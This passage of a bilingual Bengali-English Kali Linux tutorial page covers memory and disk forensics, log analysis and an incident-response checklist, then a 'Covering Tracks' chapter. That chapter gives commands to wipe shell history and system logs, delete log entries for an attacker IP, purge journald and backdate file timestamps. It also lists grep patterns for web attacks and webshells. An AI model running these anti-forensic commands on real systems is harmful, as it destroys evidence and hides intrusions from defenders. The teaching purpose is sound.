+<span class="c"># Volatility 3 — সম্পূর্ণ workflow</span>
+<span class="p">root@kali</span>:~# <span class="g">vol -f memory.dmp windows.info</span>           <span class="c"># OS info</span>
+<span class="p">root@kali</span>:~# <span class="g">vol -f memory.dmp windows.pslist</span>         <span class="c"># Process list</span>
+<span class="p">root@kali</span>:~# <span class="g">vol -f memory.dmp windows.pstree</span>         <span class="c"># Process tree</span>
+<span class="p">root@kali</span>:~# <span class="g">vol -f memory.dmp windows.psscan</span>         <span class="c"># Hidden processes</span>
+<span class="p">root@kali</span>:~# <span class="g">vol -f memory.dmp windows.netstat</span>        <span class="c"># Network connections</span>
+<span class="p">root@kali</span>:~# <span class="g">vol -f memory.dmp windows.cmdline</span>        <span class="c"># Command line args</span>
+<span class="p">root@kali</span>:~# <span class="g">vol -f memory.dmp windows.malfind</span>        <span class="c"># Injected code</span>
+<span class="p">root@kali</span>:~# <span class="g">vol -f memory.dmp windows.hashdump</span>       <span class="c"># Password hashes</span>
+<span class="p">root@kali</span>:~# <span class="g">vol -f memory.dmp windows.filescan | grep -i "\.txt\|\.docx\|\.pdf"</span>
+
+<span class="c"># Specific PID-এর process dump করো</span>
+<span class="p">root@kali</span>:~# <span class="g">vol -f memory.dmp windows.procdump --pid 1234 --dump-dir /tmp/dumps/</span>
+
+<span class="c"># File extract করো (offset দিয়ে)</span>
+<span class="p">root@kali</span>:~# <span class="g">vol -f memory.dmp windows.dumpfiles --virtaddr 0xc000012345</span>
+
+<span class="c"># Strings extract করো (মাঝে মাঝে password পাওয়া যায়)</span>
+<span class="p">root@kali</span>:~# <span class="g">strings memory.dmp | grep -i "password\|passwd\|credential"</span>
+    </div>
+  </div>
+</div>
+
+<!-- CH6: AUTOPSY -->
+<div class="chapter ch6">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 06</div>
+    <div class="chapter-title">💽 Autopsy & Sleuth Kit — <span class="bn-text">Disk Forensics</span><span class="en-text">Disk Forensics</span></div>
+    <div class="chapter-desc"><span class="bn-text">Disk image analysis, deleted file recovery, file timeline — digital evidence collect করো</span><span class="en-text">Disk image analysis, deleted file recovery, file timeline — collect digital evidence</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">💽 <span class="bn-text">Disk Image তৈরি করো</span><span class="en-text">Create Disk Image</span></h2>
+    <div class="code">
+<span class="c"># dd দিয়ে disk image তৈরি করো</span>
+<span class="p">root@kali</span>:~# <span class="g">dd if=/dev/sdb of=/evidence/disk.img bs=4M status=progress</span>
+
+<span class="c"># dcfldd (dd + hash verification)</span>
+<span class="p">root@kali</span>:~# <span class="g">dcfldd if=/dev/sdb of=/evidence/disk.img hash=md5 md5log=/evidence/hash.txt</span>
+
+<span class="c"># Image verify করো (MD5)</span>
+<span class="p">root@kali</span>:~# <span class="g">md5sum /evidence/disk.img</span>
+
+<span class="c"># Image mount করো (read-only)</span>
+<span class="p">root@kali</span>:~# <span class="g">mount -o ro,loop /evidence/disk.img /mnt/evidence</span>
+
+<span class="c"># Specific partition mount করো</span>
+<span class="p">root@kali</span>:~# <span class="g">fdisk -l disk.img</span>  <span class="c"># Partition offset দেখো</span>
+<span class="p">root@kali</span>:~# <span class="g">mount -o ro,loop,offset=$((512*2048)) disk.img /mnt/part1</span>
+    </div>
+
+    <h2 class="sec">🔍 The Sleuth Kit (TSK) — <span class="bn-text">CLI Forensics</span><span class="en-text">CLI Forensics</span></h2>
+    <table class="cmd-table">
+      <thead><tr><th><span class="bn-text">কমান্ড</span><span class="en-text">Command</span></th><th><span class="bn-text">কাজ</span><span class="en-text">Function</span></th></tr></thead>
+      <tbody>
+        <tr><td class="cmd-cell">mmls disk.img</td><td class="desc-cell"><span class="bn-text">Partition table দেখাও</span><span class="en-text">Show partition table</span></td></tr>
+        <tr><td class="cmd-cell">fsstat -o 2048 disk.img</td><td class="desc-cell"><span class="bn-text">File system info দেখাও</span><span class="en-text">Show file system info</span></td></tr>
+        <tr><td class="cmd-cell">fls -r -o 2048 disk.img</td><td class="desc-cell"><span class="bn-text">সব files ও directories list করো (deleted সহ)</span><span class="en-text">List all files and dirs (including deleted)</span></td></tr>
+        <tr><td class="cmd-cell">fls -r -d -o 2048 disk.img</td><td class="desc-cell"><span class="bn-text">শুধু deleted files দেখাও</span><span class="en-text">Show only deleted files</span></td></tr>
+        <tr><td class="cmd-cell">icat -o 2048 disk.img [inode]</td><td class="desc-cell"><span class="bn-text">Inode দিয়ে file content দেখাও / recover করো</span><span class="en-text">View/recover file by inode</span></td></tr>
+        <tr><td class="cmd-cell">ils -o 2048 disk.img</td><td class="desc-cell"><span class="bn-text">Inode information দেখাও</span><span class="en-text">Show inode information</span></td></tr>
+        <tr><td class="cmd-cell">tsk_recover disk.img /output/</td><td class="desc-cell"><span class="bn-text">Recoverable files extract করো</span><span class="en-text">Extract recoverable files</span></td></tr>
+        <tr><td class="cmd-cell">tsk_gettimes -o 2048 disk.img > timeline.txt</td><td class="desc-cell"><span class="bn-text">File timeline তৈরি করো</span><span class="en-text">Create file timeline</span></td></tr>
+        <tr><td class="cmd-cell">mactime -b timeline.txt -d > readable.csv</td><td class="desc-cell"><span class="bn-text">Human-readable timeline তৈরি করো</span><span class="en-text">Create human-readable timeline</span></td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">🖥️ Autopsy — <span class="bn-text">GUI Forensics Platform</span><span class="en-text">GUI Forensics Platform</span></h2>
+    <div class="code">
+<span class="c"># Autopsy চালু করো</span>
+<span class="p">root@kali</span>:~# <span class="g">autopsy</span>
+<span class="c"># Browser-এ যাও: http://localhost:9999/autopsy</span>
+
+<span class="c"># CLI mode-এ case তৈরি করো</span>
+<span class="p">root@kali</span>:~# <span class="g">autopsy -c /evidence/case/</span>
+    </div>
+    <table>
+      <thead><tr><th><span class="bn-text">Autopsy Feature</span></th><th><span class="bn-text">কাজ</span><span class="en-text">Function</span></th></tr></thead>
+      <tbody>
+        <tr><td><strong>Add Data Source</strong></td><td><span class="bn-text">Disk image, folder, বা VM import করো</span><span class="en-text">Import disk image, folder, or VM</span></td></tr>
+        <tr><td><strong>File Analysis</strong></td><td><span class="bn-text">File system browse, hex view, metadata দেখো</span><span class="en-text">Browse file system, hex view, view metadata</span></td></tr>
+        <tr><td><strong>Keyword Search</strong></td><td><span class="bn-text">Text string, regex দিয়ে সব file search করো</span><span class="en-text">Search all files by text string or regex</span></td></tr>
+        <tr><td><strong>Deleted Files</strong></td><td><span class="bn-text">Deleted file recover করো</span><span class="en-text">Recover deleted files</span></td></tr>
+        <tr><td><strong>Timeline Analysis</strong></td><td><span class="bn-text">File activity timeline দেখো</span><span class="en-text">View file activity timeline</span></td></tr>
+        <tr><td><strong>Hash Sets</strong></td><td><span class="bn-text">Known malware hash দিয়ে file match করো</span><span class="en-text">Match files against known malware hashes</span></td></tr>
+        <tr><td><strong>Web Artifacts</strong></td><td><span class="bn-text">Browser history, cookies, downloads দেখো</span><span class="en-text">View browser history, cookies, downloads</span></td></tr>
+        <tr><td><strong>Email Analysis</strong></td><td><span class="bn-text">Email files parse করো</span><span class="en-text">Parse email files</span></td></tr>
+        <tr><td><strong>Report Generation</strong></td><td><span class="bn-text">HTML/PDF report তৈরি করো</span><span class="en-text">Generate HTML/PDF report</span></td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">🔧 <span class="bn-text">অন্যান্য Forensics Tools</span><span class="en-text">Other Forensics Tools</span></h2>
+    <div class="code">
+<span class="c"># Foremost — file carving (deleted file recovery)</span>
+<span class="p">root@kali</span>:~# <span class="g">foremost -i disk.img -o /output/ -t jpg,pdf,doc,zip</span>
+
+<span class="c"># Scalpel — advanced file carving</span>
+<span class="p">root@kali</span>:~# <span class="g">scalpel disk.img -o /output/</span>
+
+<span class="c"># Binwalk — firmware/binary analysis</span>
+<span class="p">root@kali</span>:~# <span class="g">binwalk firmware.bin</span>                       <span class="c"># Analyze</span>
+<span class="p">root@kali</span>:~# <span class="g">binwalk -e firmware.bin</span>                    <span class="c"># Extract</span>
+<span class="p">root@kali</span>:~# <span class="g">binwalk -dd '.*' firmware.bin</span>              <span class="c"># Extract all</span>
+
+<span class="c"># Exiftool — file metadata</span>
+<span class="p">root@kali</span>:~# <span class="g">exiftool image.jpg</span>                        <span class="c"># EXIF data দেখো</span>
+<span class="p">root@kali</span>:~# <span class="g">exiftool -all= image.jpg</span>                  <span class="c"># সব metadata মুছো</span>
+<span class="p">root@kali</span>:~# <span class="g">exiftool -r *.jpg</span>                         <span class="c"># Recursive analyze</span>
+
+<span class="c"># Strings — binary থেকে readable text</span>
+<span class="p">root@kali</span>:~# <span class="g">strings -a malware.exe | grep -i "http\|pass\|key"</span>
+
+<span class="c"># File type check</span>
+<span class="p">root@kali</span>:~# <span class="g">file suspicious_file</span>
+<span class="p">root@kali</span>:~# <span class="g">xxd suspicious_file | head -5</span>   <span class="c"># Magic bytes দেখো</span>
+
+<span class="c"># Hash calculation</span>
+<span class="p">root@kali</span>:~# <span class="g">md5sum file && sha1sum file && sha256sum file</span>
+    </div>
+  </div>
+</div>
+
+<!-- CH7: LOG ANALYSIS -->
+<div class="chapter ch7">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 07</div>
+    <div class="chapter-title">📋 Log Analysis & Incident Response</div>
+    <div class="chapter-desc"><span class="bn-text">Linux ও Windows logs analyze করো, compromised system চিহ্নিত করো, evidence collect করো</span><span class="en-text">Analyze Linux and Windows logs, identify compromised systems, collect evidence</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">📄 <span class="bn-text">Linux Log Files — গুরুত্বপূর্ণ Locations</span><span class="en-text">Linux Log Files — Important Locations</span></h2>
+    <table>
+      <thead><tr><th><span class="bn-text">Log File</span></th><th><span class="bn-text">কাজ</span><span class="en-text">Function</span></th><th><span class="bn-text">গুরুত্ব</span></th></tr></thead>
+      <tbody>
+        <tr><td><code>/var/log/auth.log</code></td><td><span class="bn-text">SSH login, sudo, authentication events</span></td><td><span class="badge badge-r">Critical</span></td></tr>
+        <tr><td><code>/var/log/syslog</code></td><td><span class="bn-text">General system messages</span></td><td><span class="badge badge-y">High</span></td></tr>
+        <tr><td><code>/var/log/kern.log</code></td><td><span class="bn-text">Kernel messages</span></td><td><span class="badge badge-b">Medium</span></td></tr>
+        <tr><td><code>/var/log/apache2/access.log</code></td><td><span class="bn-text">Apache web access log</span></td><td><span class="badge badge-r">Critical</span></td></tr>
+        <tr><td><code>/var/log/apache2/error.log</code></td><td><span class="bn-text">Apache error log</span></td><td><span class="badge badge-y">High</span></td></tr>
+        <tr><td><code>/var/log/nginx/access.log</code></td><td><span class="bn-text">Nginx access log</span></td><td><span class="badge badge-r">Critical</span></td></tr>
+        <tr><td><code>/var/log/mysql/mysql.log</code></td><td><span class="bn-text">MySQL query log</span></td><td><span class="badge badge-y">High</span></td></tr>
+        <tr><td><code>/var/log/cron</code></td><td><span class="bn-text">Cron job execution log</span></td><td><span class="badge badge-y">High</span></td></tr>
+        <tr><td><code>/var/log/btmp</code></td><td><span class="bn-text">Failed login attempts (binary)</span></td><td><span class="badge badge-r">Critical</span></td></tr>
+        <tr><td><code>/var/log/wtmp</code></td><td><span class="bn-text">Login/logout history (binary)</span></td><td><span class="badge badge-y">High</span></td></tr>
+        <tr><td><code>/var/log/lastlog</code></td><td><span class="bn-text">Last login per user (binary)</span></td><td><span class="badge badge-b">Medium</span></td></tr>
+        <tr><td><code>/root/.bash_history</code></td><td><span class="bn-text">Root's command history</span></td><td><span class="badge badge-r">Critical</span></td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">🔍 <span class="bn-text">Log Analysis Commands</span><span class="en-text">Log Analysis Commands</span></h2>
+    <div class="code">
+<span class="c"># Failed SSH login attempts দেখো</span>
+<span class="p">root@kali</span>:~# <span class="g">grep "Failed password" /var/log/auth.log | tail -50</span>
+<span class="p">root@kali</span>:~# <span class="g">grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head</span>
+
+<span class="c"># Successful SSH login দেখো</span>
+<span class="p">root@kali</span>:~# <span class="g">grep "Accepted password\|Accepted publickey" /var/log/auth.log</span>
+
+<span class="c"># Sudo usage দেখো</span>
+<span class="p">root@kali</span>:~# <span class="g">grep "sudo" /var/log/auth.log | grep -v "pam_unix"</span>
+
+<span class="c"># User creation দেখো</span>
+<span class="p">root@kali</span>:~# <span class="g">grep "useradd\|adduser" /var/log/auth.log</span>
+
+<span class="c"># Web attack signatures দেখো</span>
+<span class="p">root@kali</span>:~# <span class="g">grep -E "union|select|insert|drop|exec|passwd|etc" /var/log/apache2/access.log</span>
+<span class="p">root@kali</span>:~# <span class="g">grep -E "\.\.\/|etc/passwd|/bin/sh|cmd\.exe" /var/log/apache2/access.log</span>
+
+<span class="c"># IP কতবার access করেছে</span>
+<span class="p">root@kali</span>:~# <span class="g">awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -20</span>
+
+<span class="c"># 404 errors দেখো (scanner চলছে কিনা)</span>
+<span class="p">root@kali</span>:~# <span class="g">grep " 404 " /var/log/apache2/access.log | awk '{print $1}' | sort | uniq -c | sort -rn</span>
+
+<span class="c"># Login history (binary log)</span>
+<span class="p">root@kali</span>:~# <span class="g">last -a | head -30</span>                    <span class="c"># Login history</span>
+<span class="p">root@kali</span>:~# <span class="g">lastb | head -30</span>                    <span class="c"># Failed login</span>
+<span class="p">root@kali</span>:~# <span class="g">lastlog</span>                              <span class="c"># Last login per user</span>
+<span class="p">root@kali</span>:~# <span class="g">who</span>                                  <span class="c"># Currently logged in</span>
+<span class="p">root@kali</span>:~# <span class="g">w</span>                                    <span class="c"># Who + what they're doing</span>
+    </div>
+
+    <h2 class="sec">⚙️ journalctl — <span class="bn-text">Systemd Log Analysis</span></h2>
+    <table class="cmd-table">
+      <thead><tr><th><span class="bn-text">কমান্ড</span><span class="en-text">Command</span></th><th><span class="bn-text">কাজ</span><span class="en-text">Function</span></th></tr></thead>
+      <tbody>
+        <tr><td class="cmd-cell">journalctl</td><td class="desc-cell"><span class="bn-text">সব system logs দেখাও</span><span class="en-text">Show all system logs</span></td></tr>
+        <tr><td class="cmd-cell">journalctl -f</td><td class="desc-cell"><span class="bn-text">Live log follow করো</span><span class="en-text">Follow logs live</span></td></tr>
+        <tr><td class="cmd-cell">journalctl -u ssh</td><td class="desc-cell"><span class="bn-text">SSH service logs দেখাও</span><span class="en-text">Show SSH service logs</span></td></tr>
+        <tr><td class="cmd-cell">journalctl -p err</td><td class="desc-cell"><span class="bn-text">Error level logs দেখাও</span><span class="en-text">Show error level logs</span></td></tr>
+        <tr><td class="cmd-cell">journalctl --since "1 hour ago"</td><td class="desc-cell"><span class="bn-text">গত ১ ঘণ্টার logs দেখাও</span><span class="en-text">Show logs from last 1 hour</span></td></tr>
+        <tr><td class="cmd-cell">journalctl --since "2024-01-01" --until "2024-01-02"</td><td class="desc-cell"><span class="bn-text">নির্দিষ্ট সময়ের logs দেখাও</span><span class="en-text">Show logs for specific time range</span></td></tr>
+        <tr><td class="cmd-cell">journalctl -n 100</td><td class="desc-cell"><span class="bn-text">শেষ ১০০ লাইন দেখাও</span><span class="en-text">Show last 100 lines</span></td></tr>
+        <tr><td class="cmd-cell">journalctl _UID=1000</td><td class="desc-cell"><span class="bn-text">নির্দিষ্ট UID-এর logs</span><span class="en-text">Logs for specific UID</span></td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">🚨 <span class="bn-text">Compromised System Checklist</span><span class="en-text">Compromised System Checklist</span></h2>
+    <div class="code">
+<span class="c"># === আক্রান্ত সিস্টেম identify করার checklist ===</span>
+
+<span class="c"># 1. Unusual processes</span>
+target$ <span class="g">ps auxf</span>                                 <span class="c"># Suspicious processes</span>
+target$ <span class="g">ps aux | grep -v "^root\|^www-data\|^systemd"</span>
+
+<span class="c"># 2. Network connections</span>
+target$ <span class="g">ss -tulnp</span>                              <span class="c"># Unknown listening ports</span>
+target$ <span class="g">ss -tp | grep ESTABLISHED</span>             <span class="c"># Established connections</span>
+target$ <span class="g">netstat -ano | grep -v "127.0.0.1"</span>
+
+<span class="c"># 3. Recently modified files</span>
+target$ <span class="g">find / -mtime -1 -type f 2>/dev/null | grep -v proc</span>
+target$ <span class="g">find /var/www /tmp /dev/shm -type f -mtime -7 2>/dev/null</span>
+
+<span class="c"># 4. Suspicious files in temp locations</span>
+target$ <span class="g">ls -la /tmp/ /var/tmp/ /dev/shm/</span>
+
+<span class="c"># 5. Crontab anomalies</span>
+target$ <span class="g">cat /etc/crontab && ls /etc/cron*</span>
+target$ <span class="g">for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l 2>/dev/null; done</span>
+
+<span class="c"># 6. New user accounts</span>
+target$ <span class="g">awk -F: '$3 >= 1000 {print}' /etc/passwd</span>
+target$ <span class="g">grep -v "^#" /etc/sudoers</span>
+
+<span class="c"># 7. SUID files (newly added)</span>
+target$ <span class="g">find / -perm -4000 -newer /etc/passwd 2>/dev/null</span>
+
+<span class="c"># 8. Webshells খোঁজো</span>
+target$ <span class="g">find /var/www -name "*.php" -newer /var/www/index.php 2>/dev/null</span>
+target$ <span class="g">grep -rn "system\|exec\|shell_exec\|passthru\|eval\|base64_decode" /var/www/ 2>/dev/null</span>
+
+<span class="c"># 9. Rootkit check</span>
+<span class="p">root@kali</span>:~# <span class="g">rkhunter --check --skip-keypress</span>
+<span class="p">root@kali</span>:~# <span class="g">chkrootkit</span>
+
+<span class="c"># 10. Open files</span>
+target$ <span class="g">lsof -i 4 -n -P | grep LISTEN</span>           <span class="c"># Listening services</span>
+target$ <span class="g">lsof +D /tmp</span>                             <span class="c"># /tmp-এ open files</span>
+    </div>
+  </div>
+</div>
+
+<!-- CH8: COVERING TRACKS -->
+<div class="chapter ch8">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 08</div>
+    <div class="chapter-title">🧹 <span class="bn-text">Covering Tracks — নিজেকে মুছে ফেলো</span><span class="en-text">Covering Tracks — Remove Your Presence</span></div>
+    <div class="chapter-desc"><span class="bn-text">Log clear, history delete, timestamp modify — attacker ও defender উভয়ের জানা দরকার</span><span class="en-text">Log clearing, history deletion, timestamp modification — both attackers and defenders must know this</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <div class="box warn">
+      <div class="box-t">⚠️ <span class="bn-text">শুধু Authorized Environment-এ</span><span class="en-text">Authorized Environment Only</span></div>
+      <span class="bn-text">এই techniques শুধু Penetration Testing বা CTF-এর জন্য। Defender হিসেবে এগুলো জানা দরকার কারণ attacker কী করতে পারে সেটা বুঝলে তুমি আরও ভালো protect করতে পারবে।</span>
+      <span class="en-text">These techniques are only for Penetration Testing or CTF. Defenders need to know them to understand what attackers might do and protect systems better.</span>
+    </div>
+
+    <h2 class="sec">🗑️ <span class="bn-text">History ও Log Clear করা</span><span class="en-text">Clear History & Logs</span></h2>
+    <div class="code">
+<span class="c"># Bash history disable করো (session শুরুতে)</span>
+target$ <span class="g">unset HISTFILE</span>
+target$ <span class="g">export HISTSIZE=0</span>
+target$ <span class="g">export HISTFILESIZE=0</span>
+
+<span class="c"># History file মুছো</span>
+target$ <span class="g">history -c && history -w</span>
+target$ <span class="g">cat /dev/null > ~/.bash_history</span>
+target$ <span class="g">rm -f ~/.bash_history</span>
+
+<span class="c"># Current session history দেখতে না দাও</span>
+target$ <span class="g">export HISTFILE=/dev/null</span>
+
+<span class="c"># Auth log clear করো (root দরকার)</span>
+target$ <span class="g">cat /dev/null > /var/log/auth.log</span>
+target$ <span class="g">cat /dev/null > /var/log/syslog</span>
+
+<span class="c"># Specific entry মুছো</span>
+target$ <span class="g">sed -i '/192.168.1.100/d' /var/log/auth.log</span>
+target$ <span class="g">sed -i '/attacker_ip/d' /var/log/apache2/access.log</span>
+
+<span class="c"># lastlog, wtmp, btmp clear করো</span>
+target$ <span class="g">cat /dev/null > /var/log/wtmp</span>
+target$ <span class="g">cat /dev/null > /var/log/btmp</span>
+
+<span class="c"># Journalctl logs clear করো</span>
+target$ <span class="g">journalctl --rotate && journalctl --vacuum-time=1s</span>
+    </div>
+
+    <h2 class="sec">⏱️ <span class="bn-text">File Timestamp Modify করো</span><span class="en-text">Modify File Timestamps</span></h2>
+    <div class="code">
+<span class="c"># File-এর timestamp আগের মতো করো</span>
+target$ <span class="g">touch -t 202301011200 /tmp/malware.sh</span>       <span class="c"># Jan 1, 2023, 12:00</span>
+
+<span class="c"># অন্য file-এর মতো timestamp করো</span>
+target$ <span class="g">touch -r /etc/passwd /tmp/suspicious_file</span>
+
+<span class="c"># Access ও modify time আলাদাভাবে সেট করো</span>
+target$ <span class="g">touch -a -t 202301010000 file</span>             <span class="c"># Access time</span>
+target$ <span class="g">touch -m -t 202301010000 file</span>             <span class="c"># Modify time</span>
+    </div>
+
+    <h2 class="sec">🔒 <span class="bn-text">Persistence Remove করো</span><span class="en-text">Remove Persistence</span></h2>
+    <div class="code">
+<span class="c"># Cron job remove করো</span>
+target$ <span class="g">crontab -r</span>                                <span class="c"># Current user-এর crontab</span>
+target$ <span class="g">crontab -u root -r</span>                        <span class="c"># Root-এর crontab</span>
+
+<span class="c"># Dropped files মুছো</span>
+target$ <span class="g">shred -zu /tmp/payload.sh</span>               <span class="c"># Secure delete (overwrite)</span>
+target$ <span class="g">rm -rf /tmp/.hidden_folder/</span>
+
+<span class="c"># SSH authorized_keys থেকে key মুছো</span>
+target$ <span class="g">sed -i '/attacker_key/d' ~/.ssh/authorized_keys</span>
+
+<span class="c"># Added user remove করো</span>
+target$ <span class="g">userdel -r backdoor_user</span>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>🔬 <span class="bn-text">Post-Exploitation & Forensics — মূল কথা</span><span class="en-text">Post-Exploitation & Forensics — Key Points</span></h3>
+      <ul>
+        <li>🐛 <span class="bn-text"><strong>LinPEAS/WinPEAS:</strong> Shell পাওয়ার সাথে সাথেই চালাও — PrivEsc vector খুঁজে দেবে</span><span class="en-text"><strong>LinPEAS/WinPEAS:</strong> Run immediately after getting shell — finds PrivEsc vectors</span></li>
+        <li>⬆️ <span class="bn-text"><strong>PrivEsc Order:</strong> Sudo → SUID → Cron → PATH → Capabilities → Kernel</span></li>
+        <li>🚇 <span class="bn-text"><strong>Pivoting:</strong> Internal network-এ পৌঁছাতে Chisel SOCKS proxy সবচেয়ে reliable</span><span class="en-text"><strong>Pivoting:</strong> Chisel SOCKS proxy is most reliable for reaching internal networks</span></li>
+        <li>🧠 <span class="bn-text"><strong>Memory Forensics:</strong> RAM dump পেলে প্রথমে pslist, psscan, netstat, malfind চালাও</span><span class="en-text"><strong>Memory Forensics:</strong> With RAM dump first run pslist, psscan, netstat, malfind</span></li>
+        <li>💽 <span class="bn-text"><strong>Disk Forensics:</strong> Image তৈরির পরে MD5 verify করো — chain of custody রক্ষা</span><span class="en-text"><strong>Disk Forensics:</strong> Verify MD5 after imaging — preserve chain of custody</span></li>
+        <li>📋 <span class="bn-text"><strong>Logs:</strong> /var/log/auth.log ও web logs সবার আগে দেখো — attacker-এর footprint পাবে</span><span class="en-text"><strong>Logs:</strong> Check /var/log/auth.log and web logs first — find attacker footprints</span></li>
+      </ul>
+    </div>
+
+    <!-- SERIES COMPLETE -->
+    <div style="text-align:center; margin-top:50px; padding:35px; background: linear-gradient(135deg, #001a1a, #004d40); border-radius:16px; color:rgba(255,255,255,0.8);">
+      <p style="font-size:22px; color:#67e8f9; margin-bottom:8px; font-weight:700;">🎉 Kali Linux Series — সম্পূর্ণ!</p>
+      <p style="font-size:15px; color:rgba(255,255,255,0.7); margin-bottom:20px;"><span class="bn-text">সিরিজের সব Part সফলভাবে শেষ হয়েছে।</span><span class="en-text">All parts of the series successfully completed.</span></p>
+      <div style="display:grid; grid-template-columns: 1fr 1fr; gap: 10px; max-width: 600px; margin: 0 auto 20px; text-align:left;">
+        <div style="background:rgba(255,255,255,0.08); padding:10px 16px; border-radius:8px; font-size:13px;">✅ Part 1 — Basic Commands + Recon</div>
+        <div style="background:rgba(255,255,255,0.08); padding:10px 16px; border-radius:8px; font-size:13px;">✅ Part 2 — Web Hacking Tools</div>
+        <div style="background:rgba(255,255,255,0.08); padding:10px 16px; border-radius:8px; font-size:13px;">✅ Part 3 — Exploitation Tools</div>
+        <div style="background:rgba(255,255,255,0.08); padding:10px 16px; border-radius:8px; font-size:13px;">✅ Part 4 — Password + Wireless</div>
+        <div style="background:rgba(45,198,83,0.15); border: 1px solid rgba(45,198,83,0.3); padding:10px 16px; border-radius:8px; font-size:13px; grid-column: 1/-1; text-align:center;">✅ Part 5 — Post-Exploitation + Forensics</div>
+      </div>
+      <p style="font-size:14px; color:#67e8f9; margin-bottom:8px;">🐧 "The best security professional is the one who thinks like an attacker and defends like a guardian."</p>
+      <p style="font-size:12px; color:rgba(255,255,255,0.4); margin-top:15px;"><span class="bn-text">সব কিছু authorized environment-এ practice করো। Permission ছাড়া কোনো system-এ attack করা সম্পূর্ণ illegal।</span><span class="en-text">Practice in authorized environments only. Attacking systems without permission is completely illegal.</span></p>
+      <p style="margin-top:12px; font-size:12px; color:#2dc653;">Kali Linux Series — Part 5 | v1.0 | Post-Exploitation & Forensics</p>
+    </div>
+  </div>
+</div>
+
+<script>
+const body = document.body;
+body.classList.add('light-mode');
+function toggleTheme() {
+  const btn = document.getElementById('themeBtn');
+  if (body.classList.contains('light-mode')) {
+    body.classList.replace('light-mode', 'dark-mode');
+    btn.textContent = '☀️ Light Mode'; btn.style.background = '#ffd60a'; btn.style.color = '#0d1b2a';
+    localStorage.setItem('theme', 'dark');
+  } else {
+    body.classList.replace('dark-mode', 'light-mode');
+    btn.textContent = '🌙 Dark Mode'; btn.style.background = '#2dc653'; btn.style.color = '#0d1b2a';
+    localStorage.setItem('theme', 'light');
+  }
+}
+function toggleLang() {
+  const btn = document.getElementById('langBtn');
+  if (body.classList.contains('lang-en')) {
+    body.classList.remove('lang-en');
+    btn.textContent = '🇬🇧 English'; btn.style.background = '#0077b6';
+    localStorage.setItem('lang', 'bn');
+  } else {
+    body.classList.add('lang-en');
+    btn.textContent = '🇧🇩 বাংলা'; btn.style.background = '#e63946';
+    localStorage.setItem('lang', 'en');
+  }
+}
+window.addEventListener('DOMContentLoaded', () => {
+  const savedTheme = localStorage.getItem('theme');
+  const savedLang = localStorage.getItem('lang');
+  if (savedTheme === 'dark') {
+    body.classList.replace('light-mode', 'dark-mode');
+    const btn = document.getElementById('themeBtn');
+    if (btn) { btn.textContent = '☀️ Light Mode'; btn.style.background = '#ffd60a'; btn.style.color = '#0d1b2a'; }
+  }
+  if (savedLang === 'en') {
+    body.classList.add('lang-en');
+    const btn = document.getElementById('langBtn');
+    if (btn) { btn.textContent = '🇧🇩 বাংলা'; btn.style.background = '#e63946'; }
+  }
+});
+</script>
+</body>
+</html>
